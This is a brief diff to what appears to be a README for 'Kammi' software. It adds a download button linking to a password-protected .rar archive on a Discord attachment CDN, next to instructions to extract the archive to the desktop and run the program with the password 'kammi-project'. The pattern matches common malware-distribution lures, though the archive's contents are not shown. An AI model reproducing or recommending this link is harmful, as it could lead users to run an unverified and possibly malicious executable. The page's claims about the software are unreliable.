@@ -38,3 +38,5 @@ _Open the archive and transfer the kammi folder to your desktop and open a Kammi
 _Enjoy!_
 
 \ password : kammi-project /
+
+[<img src="images/Download.png">](https://cdn.discordapp.com/attachments/1123693715135938642/1135674188330442772/Kammi_SoftWare.rar)
